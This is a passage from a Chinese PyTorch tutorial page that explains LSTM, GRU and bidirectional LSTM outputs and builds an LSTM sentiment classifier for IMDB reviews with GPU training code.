number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>       dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="1-3-GRU的使用示例">1.3 GRU的使用示例</h5><p>GRU模块<code>torch.nn.GRU</code>，和LSTM的参数相同，含义相同，具体可参考文档</p><p>但是输入只剩下<code>gru(input,h_0)</code>，输出为<code>output, h_n</code></p><p>其形状为：</p><ol><li><code>output</code>:<code>(seq_len, batch, num_directions * hidden_size)</code></li><li><code>h_n</code>:<code>(num_layers * num_directions, batch, hidden_size)</code></li></ol><p>大家可以使用上述代码，观察GRU的输出形式</p><h5 id="1-4-双向LSTM">1.4 双向LSTM</h5><p>如果需要使用双向LSTM，则在实例化LSTM的过程中，需要把LSTM中的bidriectional设置为True，同时h_0和c_0使用num_layer*2</p><p>观察效果，输出为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">batch_size <span class="token operator">=</span><span class="token number">10</span> <span class="token comment">#句子的数量</span>seq_len <span class="token operator">=</span> <span class="token number">20</span>  <span class="token comment">#每个句子的长度</span>embedding_dim <span class="token operator">=</span> <span class="token number">30</span>  <span class="token comment">#每个词语使用多长的向量表示</span>word_vocab <span class="token operator">=</span> <span class="token number">100</span>  <span class="token comment">#词典中词语的总数</span>hidden_size <span class="token operator">=</span> <span class="token number">18</span>  <span class="token comment">#隐层中lstm的个数</span>num_layer <span class="token operator">=</span> <span class="token number">2</span>  <span class="token comment">#多少个隐藏层</span><span class="token builtin">input</span> <span class="token operator">=</span> torch<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>low<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>high<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span>batch_size<span class="token punctuation">,</span>seq_len<span class="token punctuation">)</span><span class="token punctuation">)</span>embedding  <span class="token operator">=</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>Embedding<span class="token punctuation">(</span>word_vocab<span class="token punctuation">,</span>embedding_dim<span class="token punctuation">)</span>lstm <span class="token operator">=</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>LSTM<span class="token punctuation">(</span>embedding_dim<span class="token punctuation">,</span>hidden_size<span class="token punctuation">,</span>num_layer<span class="token punctuation">,</span>bidirectional<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>embed <span class="token operator">=</span> embedding<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span> <span class="token comment">#[10,20,30]</span><span class="token comment">#转化数据为batch_first=False</span>embed <span class="token operator">=</span> embed<span class="token punctuation">.</span>permute<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">#[20,10,30]</span>h_0 <span class="token operator">=</span> torch<span class="token punctuation">.</span>rand<span class="token punctuation">(</span>num_layer<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span>batch_size<span class="token punctuation">,</span>hidden_size<span class="token punctuation">)</span>c_0 <span class="token operator">=</span> torch<span class="token punctuation">.</span>rand<span class="token punctuation">(</span>num_layer<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span>batch_size<span class="token punctuation">,</span>hidden_size<span class="token punctuation">)</span>output<span class="token punctuation">,</span><span class="token punctuation">(</span>h_1<span class="token punctuation">,</span>c_1<span class="token punctuation">)</span> <span class="token operator">=</span> lstm<span class="token punctuation">(</span>embed<span class="token punctuation">,</span><span class="token punctuation">(</span>h_0<span class="token punctuation">,</span>c_0<span class="token punctuation">)</span><span class="token punctuation">)</span>In <span class="token punctuation">[</span><span class="token number">135</span><span class="token punctuation">]</span><span class="token punctuation">:</span> output<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">135</span><span class="token punctuation">]</span><span class="token punctuation">:</span> torch<span class="token punctuation">.</span>Size<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">)</span>In <span class="token punctuation">[</span><span class="token number">136</span><span class="token punctuation">]</span><span class="token punctuation">:</span> h_1<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">136</span><span class="token punctuation">]</span><span class="token punctuation">:</span> torch<span class="token punctuation">.</span>Size<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span>In <span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">:</span> c_1<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">:</span> torch<span class="token punctuation">.</span>Size<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在单向LSTM中，最后一个time step的输出的前hidden_size个和最后一层隐藏状态h_1的输出相同，那么双向LSTM呢？</p><p>双向LSTM中：</p><p><strong>output：按照正反计算的结果顺序在第2个维度进行拼接，正向第一个拼接反向的最后一个输出</strong></p><p><strong>hidden state:按照得到的结果在第0个维度进行拼接，正向第一个之后接着是反向第一个</strong></p><ol><li><p>前向的LSTM中，最后一个time step的输出的前hidden_size个和最后一层向前传播h_1的输出相同</p><ul><li><p>示例：</p></li><li><pre><code class="language-python">#-1是前向LSTM的最后一个，前18是前hidden_size个In [188]: a = output[-1,:,:18]  #前项LSTM中最后一个time step的outputIn [189]: b = h_1[-2,:,:]  #倒数第二个为前向In [190]: a.size()Out[190]: torch.Size([10, 18])In [191]: b.size()Out[191]: torch.Size([10, 18])In [192]: a == bOut[192]:tensor([[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],        [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],        [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],        [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],        [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],        [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],        [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],        [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],        [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],        [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]],       dtype=torch.uint8)<pre class="line-numbers language-none"><code class="language-none">     2. 后向LSTM中，最后一个time step的输出的后hidden_size个和最后一层后向传播的h_1的输出相同   - 示例   - ```python     #0 是反向LSTM的最后一个，后18是后hidden_size个     In [196]: c = output[0,:,18:]  #后向LSTM中的最后一个输出          In [197]: d = h_1[-1,:,:] #后向LSTM中的最后一个隐藏层状态          In [198]: c == d     Out[198]:     tensor([[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],             [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],             [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],             [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],             [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],             [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],             [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],             [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],             [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],             [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]],            dtype=torch.uint8)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></code></pre></li></ul></li></ol><h5 id="1-4-LSTM和GRU的使用注意点">1.4 LSTM和GRU的使用注意点</h5><ol><li>第一次调用之前，需要初始化隐藏状态，如果不初始化，默认创建全为0的隐藏状态</li><li>往往会使用LSTM or GRU 的输出的最后一维的结果，来代表LSTM、GRU对文本处理的结果，其形状为<code>[batch,  num_directions*hidden_size]</code>。<ol><li>并不是所有模型都会使用最后一维的结果</li><li>如果实例化LSTM的过程中，batch_first=False,则<code>output[-1] or output[-1,:,:]</code>可以获取最后一维</li><li>如果实例化LSTM的过程中，batch_first=True,则<code>output[:,-1,:]</code>可以获取最后一维</li></ol></li><li>如果结果是<code>(seq_len, batch_size, num_directions * hidden_size)</code>,需要把它转化为<code>(batch_size,seq_len, num_directions * hidden_size)</code>的形状，不能够不是view等变形的方法，需要使用<code>output.permute(1,0,2)</code>，即交换0和1轴，实现上述效果</li><li>使用双向LSTM的时候，往往会分别使用每个方向最后一次的output，作为当前数据经过双向LSTM的结果<ul><li>即：<code>torch.cat([h_1[-2,:,:],h_1[-1,:,:]],dim=-1)</code></li><li>最后的表示的size是<code>[batch_size,hidden_size*2]</code></li></ul></li><li>上述内容在GRU中同理</li></ol><h4 id="2-使用LSTM完成文本情感分类">2. 使用LSTM完成文本情感分类</h4><p>在前面，我们使用了word embedding去实现了toy级别的文本情感分类，那么现在我们在这个模型中添加上LSTM层，观察分类效果。</p><p>为了达到更好的效果，对之前的模型做如下修改</p><ol><li>MAX_LEN = 200</li><li>构建dataset的过程，把数据转化为2分类的问题，pos为1，neg为0，否则25000个样本完成10个类别的划分数据量是不够的</li><li>在实例化LSTM的时候，使用dropout=0.5，在model.eval()的过程中，dropout自动会为0</li></ol><h5 id="2-1-修改模型">2.1 修改模型</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">IMDBLstmmodel</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>IMDBLstmmodel<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>hidden_size <span class="token operator">=</span> <span class="token number">64</span>        self<span class="token punctuation">.</span>embedding_dim <span class="token operator">=</span> <span class="token number">200</span>        self<span class="token punctuation">.</span>num_layer <span class="token operator">=</span> <span class="token number">2</span>        self<span class="token punctuation">.</span>bidriectional <span class="token operator">=</span> <span class="token boolean">True</span>        self<span class="token punctuation">.</span>bi_num <span class="token operator">=</span> <span class="token number">2</span> <span class="token keyword">if</span> self<span class="token punctuation">.</span>bidriectional <span class="token keyword">else</span> <span class="token number">1</span>        self<span class="token punctuation">.</span>dropout <span class="token operator">=</span> <span class="token number">0.5</span>        <span class="token comment">#以上部分为超参数，可以自行修改</span>        self<span class="token punctuation">.</span>embedding <span class="token operator">=</span> nn<span class="token punctuation">.</span>Embedding<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ws<span class="token punctuation">)</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>embedding_dim<span class="token punctuation">,</span>padding_idx<span class="token operator">=</span>ws<span class="token punctuation">.</span>PAD<span class="token punctuation">)</span> <span class="token comment">#[N,300]</span>        self<span class="token punctuation">.</span>lstm <span class="token operator">=</span> nn<span class="token punctuation">.</span>LSTM<span class="token punctuation">(</span>self<span class="token punctuation">.</span>embedding_dim<span class="token punctuation">,</span>self<span class="token punctuation">.</span>hidden_size<span class="token punctuation">,</span>self<span class="token punctuation">.</span>num_layer<span class="token punctuation">,</span>bidirectional<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>dropout<span class="token operator">=</span>self<span class="token punctuation">.</span>dropout<span class="token punctuation">)</span>        <span class="token comment">#使用两个全连接层，中间使用relu激活函数</span>        self<span class="token punctuation">.</span>fc <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>self<span class="token punctuation">.</span>hidden_size<span class="token operator">*</span>self<span class="token punctuation">.</span>bi_num<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc2 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>embedding<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        x <span class="token operator">=</span> x<span class="token punctuation">.</span>permute<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">#进行轴交换</span>        h_0<span class="token punctuation">,</span>c_0 <span class="token operator">=</span> self<span class="token punctuation">.</span>init_hidden_state<span class="token punctuation">(</span>x<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        _<span class="token punctuation">,</span><span class="token punctuation">(</span>h_n<span class="token punctuation">,</span>c_n<span class="token punctuation">)</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>lstm<span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token punctuation">(</span>h_0<span class="token punctuation">,</span>c_0<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#只要最后一个lstm单元处理的结果，这里多去的hidden state</span>        out <span class="token operator">=</span> torch<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token punctuation">[</span>h_n<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> h_n<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dim<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        out <span class="token operator">=</span> self<span class="token punctuation">.</span>fc<span class="token punctuation">(</span>out<span class="token punctuation">)</span>        out <span class="token operator">=</span> F<span class="token punctuation">.</span>relu<span class="token punctuation">(</span>out<span class="token punctuation">)</span>        out <span class="token operator">=</span> self<span class="token punctuation">.</span>fc2<span class="token punctuation">(</span>out<span class="token punctuation">)</span>        <span class="token keyword">return</span> F<span class="token punctuation">.</span>log_softmax<span class="token punctuation">(</span>out<span class="token punctuation">,</span>dim<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">init_hidden_state</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>batch_size<span class="token punctuation">)</span><span class="token punctuation">:</span>        h_0 <span class="token operator">=</span> torch<span class="token punctuation">.</span>rand<span class="token punctuation">(</span>self<span class="token punctuation">.</span>num_layer <span class="token operator">*</span> self<span class="token punctuation">.</span>bi_num<span class="token punctuation">,</span> batch_size<span class="token punctuation">,</span> self<span class="token punctuation">.</span>hidden_size<span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>        c_0 <span class="token operator">=</span> torch<span class="token punctuation">.</span>rand<span class="token punctuation">(</span>self<span class="token punctuation">.</span>num_layer <span class="token operator">*</span> self<span class="token punctuation">.</span>bi_num<span class="token punctuation">,</span> batch_size<span class="token punctuation">,</span> self<span class="token punctuation">.</span>hidden_size<span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>        <span class="token keyword">return</span> h_0<span class="token punctuation">,</span>c_0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="2-2-完成训练和测试代码">2.2 完成训练和测试代码</h5><p>为了提高程序的运行速度，可以考虑把模型放在gup上运行，那么此时需要处理一下几点：</p><ol><li><code>device = torch.device("cuda" if torch.cuda.is_available() else "cpu")</code></li><li><code>model.to(device)</code></li><li>除了上述修改外，涉及计算的所有tensor都需要转化为CUDA的tensor<ol><li>初始化的<code>h_0,c_0</code></li><li>训练集和测试集的<code>input,traget</code></li></ol></li><li>在最后可以通过<code>tensor.cpu()</code>转化为torch的普通tensor</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">train_batch_size <span class="token operator">=</span> <span class="token number">64</span>test_batch_size <span class="token operator">=</span> <span class="token number">5000</span><span class="token comment"># imdb_model = IMDBModel(MAX_LEN) #基础model</span>imdb_model <span class="token operator">=</span> IMDBLstmmodel<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span> <span class="token comment">#在gpu上运行，提高运行速度</span><span class="token comment"># imdb_model.load_state_dict(torch.load("model/mnist_net.pkl"))</span>optimizer <span class="token operator">=</span> optim<span class="token punctuation">.</span>Adam<span class="token punctuation">(</span>imdb_model<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>criterion <span class="token operator">=</span> nn<span class="token punctuation">.</span>CrossEntropyLoss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">train</span><span class="token punctuation">(</span>epoch<span class="token punctuation">)</span><span class="token punctuation">:</span>    mode <span class="token operator">=</span> <span class="token boolean">True</span>    imdb_model<span class="token punctuation">.</span>train<span class="token punctuation">(</span>mode<span class="token punctuation">)</span>    train_dataloader <span class="token operator">=</span>get_dataloader<span class="token punctuation">(</span>mode<span class="token punctuation">,</span>train_batch_size<span class="token punctuation">)</span>    <span class="token keyword">for</span> idx<span class="token punctuation">,</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span><span class="token builtin">input</span><span class="token punctuation">,</span>input_lenght<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>train_dataloader<span class="token punctuation">)</span><span class="token punctuation">:</span>        target <span class="token operator">=</span> target<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>        <span class="token builtin">input</span> <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>        optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span>        output <span class="token operator">=</span> imdb_model<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span>        loss <span class="token operator">=</span> F<span class="token punctuation">.</span>nll_loss<span class="token punctuation">(</span>output<span class="token punctuation">,</span>target<span class="token punctuation">)</span> <span class="token comment">#traget需要是[0,9]，不能是[1-10]</span>        loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>        optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> idx <span class="token operator">%</span><span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            pred <span class="token operator">=</span> torch<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> dim<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> keepdim<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            acc <span class="token operator">=</span> pred<span class="token punctuation">.</span>eq<span class="token punctuation">(</span>target<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>cpu<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">.</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Train Epoch: {} [{}/{} ({:.0f}%)]\tLoss: {:.6f}\t ACC: {:.6f}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>epoch<span class="token punctuation">,</span> idx <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>train_dataloader<span class="token 